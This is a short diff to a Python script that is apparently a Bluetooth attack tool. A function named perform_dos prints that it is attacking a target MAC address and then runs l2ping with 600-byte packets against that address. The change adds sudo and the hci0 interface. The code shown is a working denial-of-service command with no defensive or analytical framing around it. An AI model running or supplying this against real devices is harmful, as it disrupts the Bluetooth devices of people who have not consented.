@@ -29,7 +29,7 @@ def print_device_info(devices):
 
 def perform_dos(target_mac):
     print(f"Performing DoS attack on device with MAC address: {target_mac}")
-    os.system(f"l2ping -s 600 -f {target_mac}")
+    os.system(f"sudo l2ping -i hci0 -s 600 {target_mac}")
 
 def main():
     print("""    _   _  _ _____ ___   __  __   _   _  _ ___ _    ___ 
